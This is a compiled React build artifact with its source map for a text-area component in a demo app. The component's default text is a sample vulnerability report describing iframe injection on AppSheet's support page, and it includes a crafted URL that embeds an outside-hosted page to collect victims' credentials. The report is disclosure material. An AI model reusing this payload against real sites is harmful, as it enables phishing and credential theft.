{"ast":null,"code":"var _jsxFileName = \"/Users/eddypeng/Desktop/vedette-demo/frontend/src/components/TextAreaOne.js\",\n  _s = $RefreshSig$();\nimport React, { useState, useRef } from \"react\";\nimport \"../App.css\";\nimport VedetteButton from \"./VedetteButton\";\nimport { jsxDEV as _jsxDEV } from \"react/jsx-dev-runtime\";\nconst TextAreaOne = props => {\n  _s();\n  const [fieldInput, setFieldInput] = useState(\"\");\n  const inputRef = useRef(null);\n  const handleInputChange = event => {\n    setFieldInput(event.target.value);\n  };\n  const handleButtonClick = () => {\n    if (props.onButtonClick) {\n      // Pass fieldInput value to parent when button is clicked\n      props.onButtonClick(fieldInput);\n    }\n  };\n  return /*#__PURE__*/_jsxDEV(\"div\", {\n    className: \"TextAreaAndVedetteContainer\",\n    children: [/*#__PURE__*/_jsxDEV(\"div\", {\n      className: \"TextAreaContainer\",\n      children: [/*#__PURE__*/_jsxDEV(\"div\", {\n        className: \"TabContainer\",\n        children: [/*#__PURE__*/_jsxDEV(\"div\", {\n          className: \"Column Active\",\n          children: /*#__PURE__*/_jsxDEV(\"p\", {\n            children: \"WRITE\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 25,\n            columnNumber: 25\n          }, this)\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 24,\n          columnNumber: 21\n        }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n          className: \"Column\",\n          children: /*#__PURE__*/_jsxDEV(\"p\", {\n            children: \"PREVIEW\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 28,\n            columnNumber: 25\n          }, this)\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 27,\n          columnNumber: 21\n        }, this)]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 23,\n        columnNumber: 17\n      }, this), /*#__PURE__*/_jsxDEV(\"textarea\", {\n        children: \"Hi, Team this vulnerability was found in Appsheet which is the acquisition of Google, Acquired on Jan 15, 2020 Vulnerability : Onsite Iframe injection at Customer support page leads to harvest user problems & credentials Description : An iFrame injection is a very common cross-site scripting (or XSS) attack. It consists of one or more iFrame tags that have been inserted into a page or post\\u2019s content and typically downloads an executable program or conducts other actions that compromise the site visitors\\u2019 computers. In the best case, Google may label the site \\u201Cmalicious.\\u201D The worst case is that the site owner and visitors end up with malware-infected computers. frame injection, which occurs when a frame on a vulnerable web page displays another web page via a user-controllable input. Steps to Reproduce : I Have hosted a malicious code in my server i.e https://www.basubanakar.com/con.html Now By using html injection vulnerability on Appsheet main domain i.e on customer support page , I will call my malicious code using html injection or iframe injection. ex: Here vulnerable parameter is \\\"dFR[doc_type][0]=\\\" Now as an attacker I will craft that url as: https://www.appsheet.com/Support?q=%20&dFR[doc_type][0]=%3Ciframe%20src=%22https://www.basubanakar.com/con.html%22%20width=1200%20height=1000%20/%3E Now when victim opens this links I am getting his creds etc by using form.\"\n      }, void 0, false, {\n        fileName: _jsxFileName,\n        lineNumber: 31,\n        columnNumber: 17\n      }, this)]\n    }, void 0, true, {\n      fileName: _jsxFileName,\n      lineNumber: 22,\n      columnNumber: 13\n    }, this), /*#__PURE__*/_jsxDEV(VedetteButton, {\n      onClick: handleButtonClick\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 34,\n      columnNumber: 13\n    }, this)]\n  }, void 0, true, {\n    fileName: _jsxFileName,\n    lineNumber: 21,\n    columnNumber: 9\n  }, this);\n};\n_s(TextAreaOne, \"YWyYm0iej+WdYuW7LwWFErjCv9s=\");\n_c = TextAreaOne;\nexport default TextAreaOne;\nvar _c;\n$RefreshReg$(_c, \"TextAreaOne\");","map":{"version":3,"names":["React","useState","useRef","VedetteButton","jsxDEV","_jsxDEV","TextAreaOne","props","_s","fieldInput","setFieldInput","inputRef","handleInputChange","event","target","value","handleButtonClick","onButtonClick","className","children","fileName","_jsxFileName","lineNumber","columnNumber","onClick","_c","$RefreshReg$"],"sources":["/Users/eddypeng/Desktop/vedette-demo/frontend/src/components/TextAreaOne.js"],"sourcesContent":["import React, { useState, useRef } from \"react\";\nimport \"../App.css\";\nimport VedetteButton from \"./VedetteButton\";\n\nconst TextAreaOne = (props) => {\n    const [fieldInput, setFieldInput] = useState(\"\");\n    const inputRef = useRef(null);\n\n    const handleInputChange = (event) => {\n        setFieldInput(event.target.value);\n    };\n\n    const handleButtonClick = () => {\n        if (props.onButtonClick) {\n            // Pass fieldInput value to parent when button is clicked\n            props.onButtonClick(fieldInput);\n        }\n    };\n\n    return (\n        <div className=\"TextAreaAndVedetteContainer\">\n            <div className=\"TextAreaContainer\">\n                <div className=\"TabContainer\">\n                    <div className=\"Column Active\">\n                        <p>WRITE</p>\n                    </div>\n                    <div className=\"Column\">\n                        <p>PREVIEW</p>\n                    </div>\n                </div>\n                <textarea>Hi, Team this vulnerability was found in Appsheet which is the acquisition of Google, Acquired on Jan 15, 2020 Vulnerability : Onsite Iframe injection at Customer support page leads to harvest user problems & credentials Description : An iFrame injection is a very common cross-site scripting (or XSS) attack. It consists of one or more iFrame tags that have been inserted into a page or post’s content and typically downloads an executable program or conducts other actions that compromise the site visitors’ computers. In the best case, Google may label the site “malicious.” The worst case is that the site owner and visitors end up with malware-infected computers. frame injection, which occurs when a frame on a vulnerable web page displays another web page via a user-controllable input. Steps to Reproduce : I Have hosted a malicious code in my server i.e https://www.basubanakar.com/con.html Now By using html injection vulnerability on Appsheet main domain i.e on customer support page , I will call my malicious code using html injection or iframe injection. ex: Here vulnerable parameter is \"dFR[doc_type][0]=\" Now as an attacker I will craft that url as: https://www.appsheet.com/Support?q=%20&dFR[doc_type][0]=%3Ciframe%20src=%22https://www.basubanakar.com/con.html%22%20width=1200%20height=1000%20/%3E Now when victim opens this links I am getting his creds etc by using form.</textarea>\n                {/* <textarea ref={inputRef} value={fieldInput} onChange={handleInputChange}></textarea> */}\n            </div>\n            <VedetteButton onClick={handleButtonClick} />\n        </div>\n    );\n};\n\nexport default TextAreaOne;"],"mappings":";;AAAA,OAAOA,KAAK,IAAIC,QAAQ,EAAEC,MAAM,QAAQ,OAAO;AAC/C,OAAO,YAAY;AACnB,OAAOC,aAAa,MAAM,iBAAiB;AAAC,SAAAC,MAAA,IAAAC,OAAA;AAE5C,MAAMC,WAAW,GAAIC,KAAK,IAAK;EAAAC,EAAA;EAC3B,MAAM,CAACC,UAAU,EAAEC,aAAa,CAAC,GAAGT,QAAQ,CAAC,EAAE,CAAC;EAChD,MAAMU,QAAQ,GAAGT,MAAM,CAAC,IAAI,CAAC;EAE7B,MAAMU,iBAAiB,GAAIC,KAAK,IAAK;IACjCH,aAAa,CAACG,KAAK,CAACC,MAAM,CAACC,KAAK,CAAC;EACrC,CAAC;EAED,MAAMC,iBAAiB,GAAGA,CAAA,KAAM;IAC5B,IAAIT,KAAK,CAACU,aAAa,EAAE;MACrB;MACAV,KAAK,CAACU,aAAa,CAACR,UAAU,CAAC;IACnC;EACJ,CAAC;EAED,oBACIJ,OAAA;IAAKa,SAAS,EAAC,6BAA6B;IAAAC,QAAA,gBACxCd,OAAA;MAAKa,SAAS,EAAC,mBAAmB;MAAAC,QAAA,gBAC9Bd,OAAA;QAAKa,SAAS,EAAC,cAAc;QAAAC,QAAA,gBACzBd,OAAA;UAAKa,SAAS,EAAC,eAAe;UAAAC,QAAA,eAC1Bd,OAAA;YAAAc,QAAA,EAAG;UAAK;YAAAC,QAAA,EAAAC,YAAA;YAAAC,UAAA;YAAAC,YAAA;UAAA,OAAG;QAAC;UAAAH,QAAA,EAAAC,YAAA;UAAAC,UAAA;UAAAC,YAAA;QAAA,OACX,CAAC,eACNlB,OAAA;UAAKa,SAAS,EAAC,QAAQ;UAAAC,QAAA,eACnBd,OAAA;YAAAc,QAAA,EAAG;UAAO;YAAAC,QAAA,EAAAC,YAAA;YAAAC,UAAA;YAAAC,YAAA;UAAA,OAAG;QAAC;UAAAH,QAAA,EAAAC,YAAA;UAAAC,UAAA;UAAAC,YAAA;QAAA,OACb,CAAC;MAAA;QAAAH,QAAA,EAAAC,YAAA;QAAAC,UAAA;QAAAC,YAAA;MAAA,OACL,CAAC,eACNlB,OAAA;QAAAc,QAAA,EAAU;MAA82C;QAAAC,QAAA,EAAAC,YAAA;QAAAC,UAAA;QAAAC,YAAA;MAAA,OAAU,CAAC;IAAA;MAAAH,QAAA,EAAAC,YAAA;MAAAC,UAAA;MAAAC,YAAA;IAAA,OAEl4C,CAAC,eACNlB,OAAA,CAACF,aAAa;MAACqB,OAAO,EAAER;IAAkB;MAAAI,QAAA,EAAAC,YAAA;MAAAC,UAAA;MAAAC,YAAA;IAAA,OAAE,CAAC;EAAA;IAAAH,QAAA,EAAAC,YAAA;IAAAC,UAAA;IAAAC,YAAA;EAAA,OAC5C,CAAC;AAEd,CAAC;AAACf,EAAA,CAhCIF,WAAW;AAAAmB,EAAA,GAAXnB,WAAW;AAkCjB,eAAeA,WAAW;AAAC,IAAAmB,EAAA;AAAAC,YAAA,CAAAD,EAAA","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}